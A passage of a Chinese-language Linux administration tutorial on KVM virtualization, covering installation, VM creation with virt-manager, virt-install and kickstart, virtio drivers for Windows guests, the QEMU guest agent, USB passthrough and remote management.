Libvirt：提供统一API，守护进程libvirtd和相关工具，如:virsh，virt-manager等。
```

#### 46.3.2 KVM运行模式

![1658483414185](linux体系.assets/1658483414185.png)

```
内核模式：GuestOS执行I/O类操作，或其它的特殊指令的操作；称作“来宾-内核”模式。
用户模式：代表GuestOS请求I/O类操作。
来宾模式：GuestOS的非I/O类操作；它被称作“来宾-用户”模式,称作虚拟机的用户模式更贴切。
```

#### 46.3.3 KVM的组件

![1658483768097](linux体系.assets/1658483768097.png)

```
KVM：运行在内核空间，提供 CPU 和内存的虚级化，以及客户机的 I/O拦截，Guest的部分I/O被KVM拦截后，交给QEMU处理。

两类组件：
   (kvm.ko)/dev/kvm：工作为hypervisor，在用户空间可通过系统调用ioctl()与内核中的kvm模块交互，从而完成虚拟机的创建、启动、停止、删除等各种管理功能，可虚拟CPU和内存。
   qemu-kvm进程：工作于用户空间，用于实现IO设备模拟；也用于实现一个虚拟机实例。
```

### 46.4 KVM安装

```
KVM需要宿主机CPU必须支持虚拟化功能，因此如果是在vmware workstation上使用虚拟机做宿主机，那么必须要在虚拟机配置界面的处理器选项中开启虚拟机化功能。
```

#### 46.4.1 CPU开启虚拟化

![1658494542094](linux体系.assets/1658494542094.png)

**验证开启虚拟化**

```
[root@centos8 ~]# grep -Em 1 "vmx|svm" /proc/cpuinfo
flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc cpuid pni pclmulqdq vmx ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch cpuid_fault invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 xsaves arat md_clear flush_l1d arch_capabilities


#Intel CPU 对应 vmx
#AMD CPU 对应 svm


#出现kvm模块表示加载成功！！
[root@centos8 ~]# lsmod | grep kvm
kvm_intel             294912  0
kvm                   786432  1 kvm_intel
irqbypass              16384  1 kvm
```

#### 46.4.2 安装KVM工具包

```
#1.范例:CentOS 8安装KVM相关工具
[root@centos8 ~]# yum -y install qemu-kvm libvirt virt-manager virt-install virt-viewer
[root@centos8 ~]# systemctl start libvirtd


#1.1 Ubuntu安装KVM
[root@ubuntu1804 ~]#apt -y install qemu-kvm virt-manager libvirt-daemon-system
#如果没有开启CPU虚拟化功能会提示以下信息
[root@ubuntu1804 ~]#kvm-ok
INFO: Your CPU does not support KVM extensions
KVM acceleration can NOT be used

#添加CPU的虚拟化支持再执行
[root@ubuntu1804 ~]#kvm-ok
INFO: /dev/kvm exists
KVM acceleration can be used




#2.范例: CentOS 8还提供基于Web的虚拟机管理方式
[root@centos8 ~]#yum -y install cockpit
[root@centos8 ~]#systemctl enable --now cockpit.socket 
Created symlink /etc/systemd/system/sockets.target.wants/cockpit.socket → 
/usr/lib/systemd/system/cockpit.socket.


#打开浏览器，访问以下地址：
https://centos8主机:9090
```

![1658497269422](linux体系.assets/1658497269422.png)

 **图形化工具 virt-manager**

```
#1.范例: CentOS上管理工具virt-manager
[root@centos8 ~]# export DISPLAY=10.0.0.1:0.0
[root@centos8 ~]# virt-manager 
[root@centos8 ~]# libGL error: No matching fbConfigs or visuals found
libGL error: failed to load driver: swrast



#2.范例: Ubuntu上管理工具virt-manager
[root@ubuntu1804 ~]#virt-manager
```

![1658584720729](linux体系.assets/1658584720729.png)

#### 46.4.3 准备ISO相关文件

```
#centos8镜像下载地址：https://vault.centos.org/
#windows镜像下载地址：https://next.itellyou.cn/Original/或者https://msdn.itellyou.cn/
[root@centos8 ~]#mkdir -pv /data/isos/

#一共需要准备的镜像文件汇总
[root@centos8 isos]# ls /data/isos/
CentOS-7-x86_64-Minimal-2009.iso
CentOS-8.2.2004-x86_64-minimal.iso
cn_windows_10_business_editions_version_1909_updated_april_2020_x64_dvd_5d3fcf2e.iso
cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_vl_build_x64_dvd_617396.iso
virtio-win-0.1.141_amd64.vfd
virtio-win-0.1.141.iso
```

#### 46.4.4 故障排错

**AMD CPU 使用virt-manager创建虚拟机出错提示**

![1658588079013](linux体系.assets/1658588079013.png)

**AMD CPU 使用virt-install创建虚拟机出错提示**

```
[root@centos8 ~]#virt-install --virt-type kvm --name centos7 --ram 1024 --vcpus 2 --cdrom=/data/isos/CentOS-7-x86_64-Minimal-2003.iso --disk path=/var/lib/libvirt/images/centos7.qcow2 --network network=default --graphics 
vnc,listen=0.0.0.0 --noautoconsole
WARNING No operating system detected, VM performance may suffer. Specify an OS with --os-variant for optimal results.

Starting install...
ERROR   internal error: qemu unexpectedly closed the monitor: 2020-08-09T15:57:08.872365Z qemu-kvm: error: failed to set MSR 0xe1 to 0x0qemu-kvm: /builddir/build/BUILD/qemu-2.12.0/target/i386/kvm.c:2119: kvm_buf_set_msrs: Assertion `ret == cpu->kvm_msr_buf->nmsrs' failed.Domain installation does not appear to have been successful.
If it was, you can restart your domain by running:
 virsh --connect qemu:///system start centos7
otherwise, please restart your installation.
```

 **AMD CPU创建虚拟机故障修复方法**

```
#修复以上故障
[root@centos8 ~]# tee /etc/modprobe.d/qemu-system-x86.conf << EOF
> options kvm ignore_msrs=1
> EOF
options kvm ignore_msrs=1
[root@centos8 ~]#reboot
```

#### 46.4.5 创建虚拟机

##### 46.4.5.1 使用 virt-manager创建虚拟机

```
#virt-manager是一个图形化虚拟机管理工具,方便管理和查看虚拟机
[root@centos8 ~]#export DISPLAY=10.0.0.1:0.0
[root@centos8 ~]#virt-manager 
[root@centos8 ~]#libGL error: No matching fbConfigs or visuals found
libGL error: failed to load driver: swrast
```

![1658585551773](linux体系.assets/1658585551773.png)

![1658585672929](linux体系.assets/1658585672929.png)

![1658585699048](linux体系.assets/1658585699048.png)

![1658585743364](linux体系.assets/1658585743364.png)

![1658585817280](linux体系.assets/1658585817280.png)

![1658585923212](linux体系.assets/1658585923212.png)

![1658585966677](linux体系.assets/1658585966677.png)

![1658586119431](linux体系.assets/1658586119431.png)

![1658586270391](linux体系.assets/1658586270391.png)

![1658586313314](linux体系.assets/1658586481183.png)

![1658586388403](linux体系.assets/1658586388403.png)

![1658587157628](linux体系.assets/1658587157628.png)

![1658587243727](linux体系.assets/1658587243727.png)

![1658587292737](linux体系.assets/1658587292737.png)

![1658587320547](linux体系.assets/1658587320547.png)

![1658587366497](linux体系.assets/1658587366497.png)

![1658587430257](linux体系.assets/1658587430257.png)

![1658587541628](linux体系.assets/1658587541628.png)

![1658587581104](linux体系.assets/1658587581104.png)

![1658588642031](linux体系.assets/1658588642031.png)

##### 46.4.5.2 使用 virt-install创建虚拟机

**virt-install使用说明**

```
# vi rt-instal1 --help
usage: vi rt-install --name name --ram ram storage install [options]
使用'--option=?'或者'--option help'査看可用子选项
有关示例及完整选项语法，请査看man page。
使用指定安装介质新建虚拟机
optional arguments:
-h, --help show this help message and exit
--version show program* s version number and exit
--connect uri 使用 li bvi rt uri 连接至fl hypervi sor
通用选项：
-n name, --name name客户端虚拟机的名称
--memory memory配置虚拟机内存分配
例如：
--memory 1024 (in MiB)
--memory 512,maxmemory=1024
--vcpus VCPUS为虚拟机配置的vcpus数。
例如：
--vcpus 5
--vcpus 5,maxcpus=10,cpuset=l-4,6,8
--vcpus sockets=2,cores=4,threads=2
--cpu CPU CPU型号及功能。
例如：
--cpu coreduo,+x2apic
--cpu host
--metadata metadata配置虚拟机元数据
例如：
--metadata name=foo,title="My pretty title",uuid=...
--metadata description="My nice long description"
安装方法选项：
--cdrom cdrom 光驱安装介质
-1 location, --location location 安装源
例如：
nfs:host:/path
http://host/path
ftp://host/path
--pxe使用PXE协议从网络引导
--import在磁盘映像中构建虚拟机
--livecd将光驱介质视为Live CD
-x extra_args, --extra-args extra_args 附加至fl使用 --location 弓I导的内核的参数 --1 nitrd-inject initrd_inject 使用 --location 为 initrd 的 root 添加给定文件 --os-variant distro_variant在其中安装os变体的虚拟机，比如:,fedoral8\ *rhel6\ *wi nxp* 等等
--boot BOOT配置虚拟机引导设置。
例如：
--boot hd,cdrom,menu=on
--boot init=/sbin/init (for containers)
--idmap idmap为lxc容器启用用户名称空间。
例如：
--idmap uid_start=0,uid_target=1000,uid_count=10
设备选项：
--disk disk使用不同选项指定存储。例如：
--disk size=10 (new lOGiB image in default location)
--disk /my/existing/disk,cache=none
--disk device=cdrom,bus=scsi
--di sk=?
-w netoork, --network network 配置虚拟机网络接口。
例如：
--network bridge=mybrO
--network network=my_li bvi rt_vi rtual_net
--network network=mynet,model=virtio,mac=00:11...
--network none
--network help
--graphics graphics配置虚拟机显示设置。
例如：
--graphics vnc
--graph!cs spice,port=5901,tlsport=5902
--graphics none
--graphics vnc,password=foobar,port=5910,keymap=ja
--controller controller配置虚拟机控制程序设备。
例如：
--control1 er type=usb,model=ich9-ehci1
--input input配置虚拟机输入设备。
例如：
--1nput tablet
--1nput keyboard,bus=usb
--serial serial配置虚拟机串口设备
--parallel parallel配置虚拟机并口设备
--channel channel配置虚拟机沟通频道
--console CONSOLE配置虚拟机与主机之间的文本控制台连接
--hostdev HOSTDEV将物理USB/PCl/etC主机设备配置为与虚拟机共享
--filesystem filesystem将主机目录传递给虚拟机。
例如：
--fi1esystem /my/source/di r,/di r/i n/guest
--fi1esystem tempiate_name,/,type=template
--sound [sound]配置虚拟机声音设备模拟
--watchdog watchdog 配置虚拟机 watchdog 设备
--video VIDEO配置虚拟机视频硬件。
--smartcard smartcard 配置虚拟机智能卡设备。例如：--smartcard mode=passthrough
--redi rdev redirdev配置虚拟机重定向设备。例如：--redirdev
usb,type=tcp,server=192.168.1.1:4000
--memballoon memballoon 配置虚拟机 memballoon 设备I 例如：--memballoon model =vi rtio
--tpm TPM配置虚拟机TPM设备。例如：--tpm /dev/tpm
--rng rng 配置虚拟机 rng 设备。例如：--rng /dev/random
--panic panic 配置虚拟机 panic 设备。例如：--panic default

虚拟机配置选项：
--security security设定域安全驱动器配置。
--numatune numatune为域进程调整numa策略。
--memtune memtune为域进程调整内粗策略。
--blkiotune BLKIOTUNE为域进程调整 blkio 策略。
--memorybacking memorybacking为域进程设置内存后备策略。例如：
--memorybacking hugepages=on
--features FEATURES 设置域 <features> XML。
例如：
--features acpi=off
--features apic=on,eoi =on
--clock CLOCK 设置域 <clock> XMLo 例如：--clock offset=localtime,rtc_ti ckpolicy=catchup
--pm pm配置vm电源管理功能
--events events配置vm生命周期管理策略 --resource resource 配置 vm 资源分区(cgroups)

虚拟化平台选项：
-v, --hvm客户端应该是一个全虚拟客户端
-p, --paravi rt这个客户端一个是一个半虚拟客户端 --container这台虚拟机需要一个容器客户端
--vi rt-type HV_TYPE要使用的管理程序名称（kvm、qemu> xen等等）
--arch arch模拟的CPU构架
--machine MACHINE要模拟的机器类型

其它选项：
--autostart引导主机时自动启动域。
--wait wait等待安装完成的分钟数。
--noautoconsole不要自动尝试连接到客户端控制台
--noreboot完成安装后不要引导虚拟机。
--print-xml [xmlonly]输出所生成域xml,而不是创建虚拟机。
-dry-run完成安装步骤，但不要创建设备或者定义虚拟机。
--check check启用或禁用验证检査。例如：
--check path_in_use=off
--check all=off
-q, --quiet禁止无错误输出
-d, --debug输入故障排除信息
```

**利用 qemu-img命令创建虚拟磁盘**

```
注意: qemu-img create一定要确认对应路径下没有此文件,如果存在将覆盖原文件
[root@centos8 ~]# qemu-img create -f qcow2 /var/lib/libvirt/images/centos7.qcow2 20G
Formatting '/var/lib/libvirt/images/centos7.qcow2', fmt=qcow2 size=21474836480 cluster_size=65536 lazy_refcounts=off refcount_bits=16



#观察文件虚拟磁盘大小
[root@centos8 ~]# ll -h /var/lib/libvirt/images/
total 21G
-rw-r--r-- 1 root root 193K Jul 24 10:45 centos7.qcow2
-rw------- 1 qemu qemu  21G Jul 24 10:45 centos8.qcow2
```

**创建虚拟机光盘启动并手动安装**

```
#创建默认NAT模式的虚拟机,并不自动打开virt-viewer连接console,需要手动打开virt-manager连接,并手动安装系统
[root@centos8 ~]# virt-install --virt-type kvm --name centos7 --ram 1024 --vcpus 2 --cdrom=/data/isos/CentOS-7-x86_64-Minimal-2009.iso --disk path=/var/lib/libvirt/images/centos7.qcow2 --network network=default --graphics vnc,listen=0.0.0.0 --os-variant=centos7.0
```

![1658631944776](linux体系.assets/1658631944776.png)

![1658631963641](linux体系.assets/1658631963641.png)

##### 46.4.5.3 kickstart自动安装系统

 **准备 yum仓库和kickstart环境**

```
[root@centos8 ~]# yum -y install httpd
[root@centos8 ~]# systemctl enable --now httpd
[root@centos8 ~]# mkdir -pv /var/www/html/centos/{6,7,8}/os/x86_64/
[root@centos8 ~]# cat /etc/fstab 

#
# /etc/fstab
# Created by anaconda on Fri May 13 02:24:44 2022
#
# Accessible filesystems, by reference, are maintained under '/dev/disk/'.
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info.
#
# After editing this file, run 'systemctl daemon-reload' to update systemd
# units generated from this file.
#
UUID=16adb65c-9783-4c3c-bd5e-f4b45c7becca /                       xfs     defaults        0 0
UUID=633124f4-ac80-4c98-aeeb-3b5482b4ba30 /boot                   xfs     defaults        0 0
UUID=dc655f05-41d7-42ff-a686-cfc89ceb562a /data                   xfs     defaults        0 0
UUID=c73d90ff-5e94-40a8-97f9-8b39d62451a0 swap                    swap    defaults        0 0
/data/isos/CentOS-8.2.2004-x86_64-minimal.iso  /var/www/html/centos/8/os/x86_64/ iso9660  defaults 0 0  #添加这一行


[root@centos8 ~]# mount -a
mount: /var/www/html/centos/8/os/x86_64: WARNING: device write-protected, mounted read-only.
[root@centos8 ~]# df -h
Filesystem      Size  Used Avail Use% Mounted on
devtmpfs        3.8G     0  3.8G   0% /dev
tmpfs           3.9G     0  3.9G   0% /dev/shm
tmpfs           3.9G   18M  3.8G   1% /run
tmpfs           3.9G     0  3.9G   0% /sys/fs/cgroup
/dev/sda2       100G   27G   74G  27% /
/dev/sda3        50G  8.0G   42G  16% /data
/dev/sda1      1014M  225M  790M  23% /boot
tmpfs           779M   16K  779M   1% /run/user/0
/dev/loop0      1.6G  1.6G     0 100% /var/www/html/centos/8/os/x86_64  #挂载成功！！
[root@centos8 ~]# mkdir /var/www/html/ks/
[root@centos8 ~]# vim /var/www/html/ks/centos8.cfg
ignoredisk --only-use=sda
zerombr
text
reboot
clearpart --all --initlabel
selinux --disabled
firewall --disabled
url --url=http://10.0.0.8/centos/8/os/x86_64/
keyboard --vckeymap=us --xlayouts='us'
lang en_US.UTF-8

bootloader --append="net.ifnames=0" --location=mbr --boot-drive=sda
network --bootproto=dhcp --device=eth0 --ipv6=auto --activate

network --hostname=centos8.org
rootpw --iscrypted $6$j9YhzDUnQVnxaAk8$qv7rkMcPAEbV5yvwsP666DXWYadd3jYjkA9fpxAo9qYotjGGBUclCGoP1TRvgHBpqgc5n0RypMsPTQnVDcpO01
firstboot --enable
skipx
services --disabled="chronyd"
timezone Asia/Shanghai --isUtc --nontp
user --name=liu --password=6oUfb/02CWfLb5l8f$sgEZeR7c7DpqfpmFDH6huSmDbW1XQNR4qKl2EPns.gOXqlnAIgv9pTogtFVaDtEpMOC.SWXKYqxfVtd9MCwxb1 --iscrypted --gecos="liu"

autopart --type=lvm
%packages
@^minimal-environment
kexec-tools
%end
%addon com_redhat_kdump --enable --reserve-mb='auto'
%end
%anaconda
pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
%end

%post
useradd liuge
echo 123456 | passwd --stdin liuge &> /dev/null
%end
[root@centos8 ~]# ksvalidator /var/www/html/ks/centos8.cfg
```

**创建虚拟机利用kickstart实现自动安装方法**

```
[root@centos8 ~]# qemu-img create -f qcow2 /var/lib/libvirt/images/centos8-vm3.qcow2 20G
[root@centos8 ~]# virt-install --virt-type kvm --name centos8-vm3 --ram 2048 --vcpus 2 --disk path=/var/lib/libvirt/images/centos8-vm3.qcow2 --network network=default --graphics vnc,listen=0.0.0.0  --location=/data/isos/CentOS-8.2.2004-x86_64-minimal.iso --extra-args="ks=http://10.0.0.8/ks/centos8.cfg"
```

![1658635025085](linux体系.assets/1658635025085.png)

![1658635139451](linux体系.assets/1658635139451.png)

##### 46.4.5.4 基于现有虚拟机磁盘为模版创建新的虚拟机

**利用virt-manager实现**

```
[root@centos8 ~]# cd /var/lib/libvirt/images/
[root@centos8 images]# ll
total 24974604
-rw-r--r-- 1 root root  1742077952 Jul 24 12:00 centos7.qcow2
-rw------- 1 root root 21478375424 Jul 24 11:11 centos8.qcow2
-rw-r--r-- 1 root root  2353659904 Jul 24 12:09 centos8-vm3.qcow2
[root@centos8 images]# cp centos7.qcow2 centos7-vm2.qcow2


#安装虚拟机后会多生成一个centos7-vm2.xml文件
[root@centos8 images]# ll /etc/libvirt/qemu
total 28
-rw-------  1 root root 5713 Jul 24 12:59 centos7-vm2.xml
-rw-------  1 root root 5407 Jul 24 11:01 centos7.xml
-rw-------  1 root root 3601 Jul 24 11:55 centos8-vm3.xml
-rw-------  1 root root 5916 Jul 23 22:35 centos8.xml
drwx------. 3 root root   42 May 13 10:36 networks
```

![1658637104636](linux体系.assets/1658637104636.png)、![1658637176624](linux体系.assets/1658637176624.png)

![1658637289389](linux体系.assets/1658637289389.png)

![1658637383638](linux体系.assets/1658637383638.png)

![1658638715071](linux体系.assets/1658638715071.png)

![1658638750267](linux体系.assets/1658638750267.png)

![1658638766535](linux体系.assets/1658638766535.png)

![1658638816558](linux体系.assets/1658638816558.png)

**利用virt-install实现**

```
[root@centos8 images]# pwd
/var/lib/libvirt/images
[root@centos8 images]# cp centos7.qcow2 centos7-vm3.qcow2
[root@centos8 images]# virt-install --virt-type kvm --name centos7-vm3 --ram 1024 --vcpus 2 --disk bus=virtio,path=/var/lib/libvirt/images/centos7-vm3.qcow2 --network network=default,model=virtio --graphics vnc,listen=0.0.0.0 --noautoconsole --autostart --boot hd

WARNING  No operating system detected, VM performance may suffer. Specify an OS with --os-variant for optimal results.

Starting install...
Domain creation completed.
```

![1658639336794](linux体系.assets/1658639336794.png)

### 46.5 管理虚拟机

#### 46.5.1 使用半虚拟化驱动virtio

##### 46.5.1.1 半虚拟化驱动virtio的工作原理

![1658654634472](linux体系.assets/1658654634472.png)

![1658654699116](linux体系.assets/1658654699116.png)

```
virtio 是一种 I/O半虚拟化解决方案，是一套通用 I/O 设备虚拟化的程序，是对半虚拟化 Hypervisor 中的一组通用 I/O 设备的抽象，提供了一套上层应用与各 Hypervisor 虚拟化设备（KVM，Xen，VMware等）之间的通信框架和编程接口，减少跨平台所带来的兼容性问题，大大提高驱动程序开发效率，windows 系统需要单独安装virtio驱 动，linux系统自带virtio驱动。

Virtio 使用 virtqueue 来实现 I/O 机制，每个 virtqueue 就是一个承载大量数据的队列，具体使用多少个队列取决于需求，例如，virtio网络驱动程序（virtio-net）使用两个队列（一个用于接受，另一个用于发送），而virtio块驱动程序（virtio-blk）仅使用一个队列。

实现IO虚拟化主要有三种方式：全虚拟化、半虚拟化和透传，全虚拟化Guest OS不会感知到自己是虚拟机，也无需修改Guest OS，但是它的效率比较低，半虚拟化Guest OS知道自己是虚拟机，通过Frontend/Backend驱动模拟实现IO虚拟化，透传就是直接分配物理设备给VM用，但是需要解决单个硬件在多个虚拟机共享使用的问题。
```

![1658658766571](linux体系.assets/1658658766571.png)

##### 46.5.1.2 半虚拟化设备统一接口virtio

![1658659347456](linux体系.assets/1658659347456.png)

```
通过统一的接口virtio以支持的多种硬件设备
  不同的虚拟设备和不同的虚拟机可以有不同的前端驱动
  不同的硬件设备可以有不同的后端驱动
  两者之间的交互遵循virtio的标准
```

##### 46.5.1.3 Linux 的VirtIO驱动

```
[root@centos8 ~]# virt-manager
#开启centos8的虚拟机
[root@centos8 ~]# lsmod |grep virt
```

![1658659737861](linux体系.assets/1658659737861.png)

![1658659815869](linux体系.assets/1658659815869.png)

##### 46.5.1.4 Windows操作系统需要额外安装virtio的驱动

```
#方法1∶如果有红帽的RHN订阅，可以从以下位置下载virtio-win包:
https://rhn.redhat.com/rhn/software/packages/details/Overview.do?pid=868414


#方法2∶从社区获得
http://www.linux-kvm.org/page/Downloads
https://docs.fedoraproject.org/en-US/quick-docs/creating-windows-virtual-machines-using-virtio-drivers/index.html
```

![1658660140105](linux体系.assets/1658660140105.png)

![1658660225351](linux体系.assets/1658660225351.png)

![1658660317138](linux体系.assets/1658660317138.png)

![1658660338265](linux体系.assets/1658660338265.png)

#### 46.5.2  安装Windows Server虚拟机

##### 46.5.2.1 下载并准备相关文件

```
# virtio下载地址：
https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/

# virtio 历史版本下载地址：
https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-virtio/
```

![1658660898853](linux体系.assets/1658660898853.png)

![1658661042765](linux体系.assets/1658661042765.png)

```
[root@centos8 ~]# cd /data/isos/
[root@centos8 isos]# wget https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-virtio/virtio-win-0.1.141-1/virtio-win-0.1.141_amd64.vfd

#一共需要准备的镜像文件汇总
[root@centos8 isos]# ls /data/isos/
CentOS-7-x86_64-Minimal-2009.iso
CentOS-8.2.2004-x86_64-minimal.iso
cn_windows_10_business_editions_version_1909_updated_april_2020_x64_dvd_5d3fcf2e.iso
cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_vl_build_x64_dvd_617396.iso
virtio-win-0.1.141_amd64.vfd
virtio-win-0.1.141.iso
```

##### 46.5.2.2 创建Windows Server 2008虚拟机

```
#1.创建磁盘文件
[root@centos8 isos]# qemu-img create -f qcow2 /var/lib/libvirt/images/Windows-2008_r2-x86_64.qcow2 200G



#2.创建 Windows虚拟机
[root@centos8 images]# virt-install --virt-type kvm --name Win2008 --memory 3072 --vcpus=2 --os-variant=win2k8r2 --cdrom=/data/isos/cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_vl_build_x64_dvd_617396.iso --disk path=/var/lib/libvirt/images/Windows-2008_r2-x86_64.qcow2,format=qcow2,bus=virtio --disk path=/data/isos/virtio-win-0.1.141_amd64.vfd,device=floppy --network bridge=virbr0,model=virtio --graphics vnc,listen=0.0.0.0 --noautoconsole --autostart

Starting install...
Domain installation still in progress. You can reconnect to 
the console to complete the installation process.
```

![1658663443074](linux体系.assets/1658663443074.png)

![1658663503239](linux体系.assets/1658663503239.png)

![1658663527207](linux体系.assets/1658663527207.png)

![1658663540232](linux体系.assets/1658663540232.png)

![1658663908229](linux体系.assets/1658663908229.png)

![1658664060090](linux体系.assets/1658664060090.png)

![1658664096211](linux体系.assets/1658664096211.png)

![1658664135185](linux体系.assets/1658664135185.png)

![1658664184722](linux体系.assets/1658664184722.png)

![1658664269418](linux体系.assets/1658664269418.png)

![1658664341376](linux体系.assets/1658664402981.png)

![1658664512049](linux体系.assets/1658664512049.png)

![1658664591140](linux体系.assets/1658664591140.png)

![1658664448111](linux体系.assets/1658664448111.png)

![1658664841371](linux体系.assets/1658664841371.png)

![1658664887391](linux体系.assets/1658664887391.png)

##### 46.5.2.3 安装PCI内存管理驱动

![1658666487354](linux体系.assets/1658666487354.png)

![1658666551516](linux体系.assets/1658666551516.png)

![1658665051067](linux体系.assets/1658665051067.png)

![1658665088416](linux体系.assets/1658665088416.png)

![1658666708507](linux体系.assets/1658666732663.png)

![1658666935965](linux体系.assets/1658666935965.png)

![1658667005331](linux体系.assets/1658667005331.png)

##### 46.5.2.4 生成Windows Server 2008镜像模版

![1658667177434](linux体系.assets/1658667177434.png)

**下次开机需要重新初始化**

![1658667376606](linux体系.assets/1658667376606.png)

![1658667444718](linux体系.assets/1658667444718.png)

##### 46.5.2.5 安装Windows 10虚拟机

```
[root@centos8 isos]# qemu-img create -f qcow2 /var/lib/libvirt/images/Windows10.qcow2 200G

[root@centos8 isos]# virt-install --virt-type kvm --name Windows10 --ram 3072 --vcpus=2 --os-variant=win10 --cdrom=/data/isos/cn_windows_10_business_editions_version_1909_updated_april_2020_x64_dvd_5d3fcf2e.iso --disk path=/var/lib/libvirt/images/Windows10.qcow2,format=qcow2,bus=virtio --disk path=/data/isos/virtio-win-0.1.185_amd64.vfd,device=floppy --network bridge=virbr0,model=virtio --graphics vnc,listen=0.0.0.0 --noautoconsole --autostart

Starting install...
Domain installation still in progress. You can reconnect to 
the console to complete the installation process.
```

![1658668336824](linux体系.assets/1658668336824.png)

![1658668401042](linux体系.assets/1658668401042.png)

![1658668419058](linux体系.assets/1658668419058.png)

![1658668452171](linux体系.assets/1658668452171.png)

![1658668513418](linux体系.assets/1658668513418.png)

![1658668531545](linux体系.assets/1658668531545.png)

![1658668583196](linux体系.assets/1658668583196.png)

![1658668599729](linux体系.assets/1658668599729.png)

![1658674445792](linux体系.assets/1658674445792.png)

**选择"改为域加入,下一步**

![1658675340496](linux体系.assets/1658675340496.png)

![1658716592504](linux体系.assets/1658716592504.png)

![1658675800878](linux体系.assets/1658675800878.png)

#### 46.5.3 安装与配置QEMU guest agent

##### 46.5.3.1 QEMU guest agent功能

```
如果VM中安装QEMU guest agent，Host就可以使用libivrt向VM发送命令，例如“冻结”、“释放”文件系统，虚拟CPU的热添加及移除等。

在安装QEMU guest agent后，通过libvirt来使用QEMU guest agent, 可以对libvirt命令有如下的增强


virsh shutdown --mode=agent  #比--mode=acpi更加安全地关闭操作系统
virsh snapshot-create -quiesce  #在创建快照之前面，将缓存的内容刷入到磁盘
virsh domfsfreeze  #静默文件系统
virsh domfsthaw   #恢复静默的文件系统
virsh domfstrim     #让虚拟机trim文件系统
virsh domtime      #获得虚拟机的时间
virsh setvcpus       #配置虚拟机的vCPU
virsh domifaddr --source agent  #查询虚拟机的IP地址
virsh domfsinfo     #显示虚拟机的文件系统列表
virsh set-user-password #设置虚拟机用户的密码
```

##### 46.5.3.2安装QEMU guest agent

 **在Linux安装**

```
[root@centos8 ~]# yum -y install qemu-guest-agent

[root@centos8 ~]#yum info qemu-guest-agent
Last metadata expiration check: 2:46:09 ago on Thu 17 Sep 2020 09:08:54 AM CST
Available Packages
Name         : qemu-guest-agent
Epoch       : 15
Version     : 2.12.0
Release     : 99.module_el8.2.0+320+13f867d7
Architecture : x86_64
Size         : 216 k
Source       : qemu-kvm-2.12.0-99.module_el8.2.0+320+13f867d7.src.rpm
Repository   : AppStream
Summary     : QEMU guest agent
URL         : http://www.qemu.org/
License     : GPLv2 and GPLv2+ and CC-BY
Description : qemu-kvm is an open source virtualizer that provides hardware 
emulation for
             : the KVM hypervisor.
             : 
             : This package provides an agent to run inside guests, which 
communicates
             : with the host over a virtio-serial channel named 
"org.qemu.guest_agent.0"
             : 
             : This package does not need to be installed on the host OS.
```

### 46.6 libvirt管理虚拟机

#### 46.6.1 使用USB设备

##### 46.6.1.1 添加USB设备

**先在宿主机配置USB兼容性**

![1658714384939](linux体系.assets/1658714384939.png)

**在宿主机接入U盘**

```
[root@centos8 ~]#dmesg
[23687.183727] usb-storage 4-1:1.0: USB Mass Storage device detected
[23687.184183] scsi host3: usb-storage 4-1:1.0
[23687.184720] usbcore: registered new interface driver usb-storage
[23687.188873] usbcore: registered new interface driver uas
[23688.211730] scsi 3:0:0:0: Direct-Access     Kingston DataTraveler 3.0 PMAP 
PQ: 0 ANSI: 6
[23688.214257] sd 3:0:0:0: Attached scsi generic sg2 type 0
[23688.216842] sd 3:0:0:0: [sdb] 60555264 512-byte logical blocks: (31.0 GB/28.9 
GiB)
[23688.218094] sd 3:0:0:0: [sdb] Write Protect is off
[23688.218097] sd 3:0:0:0: [sdb] Mode Sense: 45 00 00 00
[23688.220335] sd 3:0:0:0: [sdb] Write cache: disabled, read cache: enabled, 
doesn't support DPO or FUA
[23688.248203] sdb: sdb1
[23688.257440] sd 3:0:0:0: [sdb] Attached SCSI removable disk
```

![1658714489667](linux体系.assets/1658714489667.png)

![1658714577560](linux体系.assets/1658714577560.png)

**然后启动就ok了**

##### 46.6.1.2 重定向USB设备

**把自己家里的USB连接到远程虚拟机中**

![1658715169937](linux体系.assets/1658715169937.png)

![1658715283010](linux体系.assets/1658715283010.png)

![1658715415910](linux体系.assets/1658715439866.png)

#### 46.6.2 远程管理KVM宿主机

**在10.0.0.7的机器上使用10.0.0.8上的虚拟机**

```
[10:23:50 root@centos7 ~]#yum -y install qemu-kvm libvirt virt-manager virt-install virt-viewer openssh-askpass
[10:23:50 root@centos7 ~]#export DISPLAY=10.0.0.1:0.0
[10:23:50 root@centos7 ~]#virt-manager
```

![1658716025707](linux体系.assets/1658716025707.png)

![1658716256737](linux体系.assets/1658716256737.png)

**输入yes**

![1658716311784](linux体系.assets/1658716311784.png)



**输入10.0.0.8的密码**

![1658716353793](linux体系.assets/1658716353793.png)

**远程连接成功**

![1658716433257](linux体系.assets/1658716433257.png)

#### 46.6.3 虚拟机的性能监控

![1658717256625](linux体系.assets/1658717256625.png)

![1658718208131](linux体系.assets/1658718208131.png)

![1658718260811](linux体系.assets/1658718260811.png)

#### 46.6.4  virsh命令行工具

```
virsh是使用libvirt managementAPI构建的管理工具,相比virt-manager可以提高效率
virsh的名称的含义是virtualization shell
```

##### 46.6.4.1 两种工作模式

**交互模式**

![1658718731077](linux体系.assets/1658718731077.png)

**非交互模式**

![1658718795113](linux体系.assets/1658718795113.png)

##### 46.6.4.2 virsh主要功能

```
[root@centos8 ~]#virsh help
 Domain Management (help keyword 'domain'):
